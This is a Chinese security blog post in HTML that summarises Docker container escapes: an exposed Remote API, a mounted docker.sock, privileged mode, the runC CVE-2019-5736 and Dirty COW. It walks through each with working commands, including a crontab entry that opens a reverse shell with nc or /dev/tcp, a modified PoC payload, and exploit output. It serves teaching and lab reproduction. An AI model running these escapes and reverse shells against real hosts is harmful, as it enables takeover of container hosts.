@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Docker 逃逸相关总结 - Geekby&#39;s Blog</title><meta name="Description" content="Docker 逃逸相关总结"><meta property="og:title" content="Docker 逃逸相关总结" />
+<meta property="og:description" content="Docker 逃逸相关总结" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-02-03T09:39:00+08:00" />
+<meta property="article:modified_time" content="2021-02-03T09:39:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Docker 逃逸相关总结"/>
+<meta name="twitter:description" content="Docker 逃逸相关总结"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/" /><link rel="prev" href="https://www.geekby.site/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><link rel="next" href="https://www.geekby.site/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Docker 逃逸相关总结",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/02\/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "云原生安全, Docker","wordcount":  522 ,
+        "url": "https:\/\/www.geekby.site\/2021\/02\/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93\/","datePublished": "2021-02-03T09:39:00+08:00","dateModified": "2021-02-03T09:39:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "Docker 逃逸相关总结"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Docker 逃逸相关总结</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw"></i>云原生安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-03">2021-02-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 522 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-docker-核心技术">1 Docker 核心技术</a>
+      <ul>
+        <li><a href="#11-namespace">1.1 namespace</a></li>
+        <li><a href="#12-docker-安全机制">1.2 docker 安全机制</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-判断是否在-docker-容器中">2 判断是否在 Docker 容器中</a></li>
+    <li><a href="#3-配置不当引发-docker-逃逸">3 配置不当引发 Docker 逃逸</a>
+      <ul>
+        <li><a href="#31-docker-remote-api-未授权访问">3.1 Docker Remote API 未授权访问</a></li>
+        <li><a href="#32-dockersock-挂载到容器内部">3.2 docker.sock 挂载到容器内部</a></li>
+        <li><a href="#33-docker-高危启动参数">3.3 Docker 高危启动参数</a>
+          <ul>
+            <li><a href="#特权模式---privileged">特权模式 &ndash;privileged</a></li>
+          </ul>
+        </li>
+        <li><a href="#34-docker-软件设计引起的逃逸">3.4 Docker 软件设计引起的逃逸</a>
+          <ul>
+            <li><a href="#341-cve-2019-5736">3.4.1 CVE-2019-5736</a></li>
+            <li><a href="#342-cve-2019-14271">3.4.2 CVE-2019-14271</a></li>
+          </ul>
+        </li>
+        <li><a href="#35-内核漏洞">3.5 内核漏洞</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="docker-逃逸相关总结">Docker 逃逸相关总结</h1>
+<h2 id="1-docker-核心技术">1 Docker 核心技术</h2>
+<p>Docker 是一个开源的应用容器引擎，可以让开发者打包任何应用以及依赖包到容器中，然后发布到任何流行的 Linux 机器上，完美的解决了测试环境与生产环境的某些不一致性问题。相比于传统的虚拟化技术， Docker 容器直接使用宿主机内核，也不存在硬件的虚拟，要轻便许多。</p>
+<p>Docker 自出现后便经常与虚拟机做比较，有些人甚至认为 Docker 就是一种虚拟机。虚拟机总的来说是利用 Hypervisor 虚拟出内存、CPU等等。</p>
+<p>我们来看一张图：我们把图中的矩形看作一个计算机，内部的圆圈看作一个又一个的进程，它们使用着相同的计算机资源，并且相互之间可以看到。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145133.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145133.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145133.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145133.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145133.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145133.png-water_print" /></p>
+<p>Docker 做了什么事呢？Docker 给它们加了一层壳，使它们隔离开来，此时它们之间无法相互看到，但是它们仍然运行在刚刚的环境上，使用着与刚刚一样的资源。我们可以理解为，它们与加壳之前的区别就是无法相互交流了。需要说一句的是，这个壳我们可以将它看作一个单向的门，外部可以往内走，但是内部却不能往外走。这在计算机中的意思就是，外部进程可以看到内部进程，但是内部进程却不能看到外部进程。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145155.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145155.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145155.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145155.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145155.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203145155.png-water_print" /></p>
+<h3 id="11-namespace">1.1 namespace</h3>
+<p>命名空间 (namespaces) 是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法，是内核级别的环境隔离。在实际的运行过程中，多个服务之间的状态或资源是会相互影响的，每一个服务都能看到其它服务的进程，也可以访问宿主机器上的任意文件，而 docker 的目的是同一台机器上的不同服务能做到<strong>完全隔离</strong>，就像运行在多台不同的机器上一样，对此就需要在创建进程的时候指定 namespaces 来实现。</p>
+<p>Linux 的命名空间机制提供了以下七种不同的命名空间，包括 <code>CLONE_NEWCGROUP</code>、<code>CLONE_NEWIPC</code>、<code>CLONE_NEWNET</code>、<code>CLONE_NEWNS</code>、<code>CLONE_NEWPID</code>、<code>CLONE_NEWUSER</code> 和 <code>CLONE_NEWUTS</code>，通过这七个选项我们能在创建新的进程时设置新进程应该在哪些资源上与宿主机器进行隔离。</p>
+<p>由以上可知，Docker 并没有使用任何虚拟化技术，其就是一种隔离技术。如果你对 Linux 命令比较熟悉，甚至可以理解为 Docker 是一种高级的 chroot。</p>
+<h3 id="12-docker-安全机制">1.2 docker 安全机制</h3>
+<p>因为 Docker 所使用的是隔离技术，使用的仍然是宿主机的内核、CPU、内存，那会不会带来一些安全问题？答案是肯定的，那 Docker 是怎么防护的？
+Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Seccomp 等等，本文主要讲述一下 Linux Capability</p>
+<p>因为 Docker 默认对 User Namespace 未进行隔离，在 Docker 内部查看  /etc/passwd 可以看到 uid 为 0，也就是说，Docker 内部的 root 就是宿主机的 root。但是如果你使用一些命令，类似 iptables -L，会提示你权限不足。</p>
+<p>这是由 Linux Capability 机制所实现的。自 Linux 内核 2.1 版本后，引入了 Capability 的概念，它打破了操作系统中超级用户/普通用户的概念，由普通用户也可以做只有超级用户可以完成的操作。</p>
+<p>Linux Capability 一共有 38 种，分别对应着一些系统调用，Docker 默认只开启了 14 种。这样就避免了很多安全的问题。熟悉 Docker 操作的人应该可以意识到，在开启 Docker 的时候可以加一个参数是 <code>--privileged=true</code>，这样就相当于开启了所有的 Capability。使用 docker inspect {container.id} 在 CapAadd 项里可以看到添加的 capability。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150136.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150136.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150136.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150136.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150136.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150136.png-water_print" /></p>
+<h2 id="2-判断是否在-docker-容器中">2 判断是否在 Docker 容器中</h2>
+<p>首先，我们需要先判断是否在 Docker 环境里，常用的两个检测方式：</p>
+<ul>
+<li>检查 <code>/.dockerenv</code> 文件是否存在</li>
+<li>检查 <code>/proc/1/cgroup</code> 内是否包含 Docker 等字符串。</li>
+</ul>
+<p>目前来说，这两种检测方式还是比较有效的，其他检测方式，如检测mount、fdisk -l 查看硬盘 、判断 PID 1 的进程名等也可用来辅助判断。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150518.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150518.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150518.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150518.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150518.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203150518.png-water_print" /></p>
+<h2 id="3-配置不当引发-docker-逃逸">3 配置不当引发 Docker 逃逸</h2>
+<h3 id="31-docker-remote-api-未授权访问">3.1 Docker Remote API 未授权访问</h3>
+<p>漏洞简述：Docker Remote API 可以执行 Docker 命令，Docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 Docker。</p>
+<p>利用方法是，我们随意启动一个容器，并将宿主机的 <code>/etc</code> 目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。</p>
+<p>EXP：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">docker</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">docker</span><span class="o">.</span><span class="n">DockerClient</span><span class="p">(</span><span class="n">base_url</span><span class="o">=</span><span class="s1">&#39;http://your-ip:2375/&#39;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">containers</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;alpine:latest&#39;</span><span class="p">,</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;sh -c &#34;echo &#39;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontab&#34; &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">remove</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">volumes</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;/etc&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;bind&#39;</span><span class="p">:</span> <span class="s1">&#39;/tmp/etc&#39;</span><span class="p">,</span> <span class="s1">&#39;mode&#39;</span><span class="p">:</span> <span class="s1">&#39;rw&#39;</span><span class="p">}})</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="32-dockersock-挂载到容器内部">3.2 docker.sock 挂载到容器内部</h3>
+<p>场景描述：简单来说就是 docker in docker，在 docker 容器中调用和执行宿主机的 docker，将 docker 宿主机的 docker 文件和 docker.sock 文件挂载到容器中，具体为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker run --rm -it <span class="se">\
+</span><span class="se"></span>  -v /var/run/docker.sock:/var/run/docker.sock <span class="se">\
+</span><span class="se"></span>  -v /usr/bin/docker:/usr/bin/docker <span class="se">\
+</span><span class="se"></span>  ubuntu <span class="se">\
+</span><span class="se"></span>  /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><p>漏洞复现：</p>
+<ol>
+<li>在容器中找到 docker.sock</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@95a280bc5a19:/# find / -name docker.sock
+/run/docker.sock
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>在容器查看宿主机 docker 信息：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker -H unix:///var/run/docker.sock info
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>运行一个新容器并挂载宿主机根路径：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>在新容器的 /test 目录下，就可以访问到宿主机的全部资源，接下来就是写入 SSH 密钥或者写入计划任务，获取 shell。</li>
+</ol>
+<h3 id="33-docker-高危启动参数">3.3 Docker 高危启动参数</h3>
+<p>Docker 中存在一些比较高危的启动命令，给予容器较大的权限，允许执行一些特权操作，在一定的条件下，可以导致容器逃逸。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker run --rm -it 
+    --privileged 
+    -v /:/soft 
+    --cap-add<span class="o">=</span>SYS_ADMIN 
+    --net<span class="o">=</span>host  
+    --pid<span class="o">=</span>host    
+    --ipc<span class="o">=</span>host 
+    ubuntu 
+    /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="特权模式---privileged">特权模式 &ndash;privileged</h4>
+<p>使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
+<ul>
+<li>通过特权模式运行一个容器：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker run -itd --privileged ubuntu:latest /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>在容器内，查看磁盘文件：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">fdisk -l
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>将 <code>/dev/sda1</code> 挂载到新建目录</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkdir /test
+mount /dev/sda1 /test
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>将计划任务写入到宿主机</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">&#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.19.0.1/4444 0&gt;&amp;1&#39;</span> &gt;&gt; /test/var/spool/cron/crontabs/root
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="34-docker-软件设计引起的逃逸">3.4 Docker 软件设计引起的逃逸</h3>
+<h4 id="341-cve-2019-5736">3.4.1 CVE-2019-5736</h4>
+<p>CVE-2019-5736 是 runC 的 CVE 漏洞编号，runC 最初是作为 Docker 的一部分开发的，后来作为一个单独的开源工具和库被提取出来，在 docker 整个架构的运行过程中，Containerd 向 docker 提供运行容器的 API，二者通过 grpc 进行交互。containerd 最后通过 runc 来实际运行容器。</p>
+<p><strong>影响版本</strong></p>
+<ul>
+<li>docker version &lt;=18.09.2</li>
+<li>RunC version &lt;=1.0-rc6</li>
+</ul>
+<p><strong>利用条件：</strong></p>
+<p>攻击者可控 image，进一步控制生成的 container</p>
+<p>攻击者具有某已存在容器的写权限，且可通过 docker exec 进入</p>
+<p><strong>漏洞复现：</strong></p>
+<ol>
+<li>测试环境镜像下载安装</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh <span class="o">&amp;&amp;</span> bash install.sh
+</code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>下载POC，修改脚本，编译</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 下载 poc</span>
+git clone https://github.com/Frichetten/CVE-2019-5736-PoC
+
+<span class="c1"># 修改Payload</span>
+vi main.go
+<span class="nv">payload</span> <span class="o">=</span> <span class="s2">&#34;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/172.19.0.1/4444 0&gt;&amp;1&#34;</span>
+
+<span class="c1"># 编译生成 payload</span>
+<span class="nv">CGO_ENABLED</span><span class="o">=</span><span class="m">0</span> <span class="nv">GOOS</span><span class="o">=</span>linux <span class="nv">GOARCH</span><span class="o">=</span>amd64 go build main.go
+
+<span class="c1"># 拷贝到 docker 容器中执行</span>
+docker cp ./main 248f8b7d3c45:/tmp
+</code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>在容器中执行 payload：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@d1b112ea4a5e:/tmp# ./main
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">16</span>
+<span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
+<span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc8201231e0<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>假设，管理员通过 exec 进入容器，从而触发 Payload。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker <span class="nb">exec</span> -it  cafa20cfb0f9 /bin/sh
+</code></pre></td></tr></table>
+</div>
+</div><p>在 172.19.0.1 上监听本地端口，成功获取宿主机反弹回来的shell。</p>
+<h4 id="342-cve-2019-14271">3.4.2 CVE-2019-14271</h4>
+<p><a href="https://xz.aliyun.com/t/6806" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/6806</a></p>
+<h3 id="35-内核漏洞">3.5 内核漏洞</h3>
+<p>Dirty Cow（CVE-2016-5195）是 Linux 内核中的权限提升漏洞，通过它可实现 Docker 容器逃逸，获得 root 权限的 shell。</p>
+<p>环境准备：</p>
+<p>docker 与宿主机共享内核，因此我们需要存在 dirtyCow 漏洞的宿主机镜像。</p>
+<p>添加容器下载并运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/gebl/dirtycow-docker-vdso.git
+<span class="nb">cd</span> dirtycow-docker-vdso/
+sudo docker-compose run dirtycow /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><p>**漏洞利用：**进入容器，编译 POC 并执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /dirtycow-vdso/
+make
+./0xdeadbeef 172.19.0.1:4444
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160116.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160116.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160116.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160116.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160116.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160116.png-water_print" /></p>
+<p>在 172.19.0.1 监听本地端口，成功接收到宿主机反弹的 shell。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160424.png-water_print"
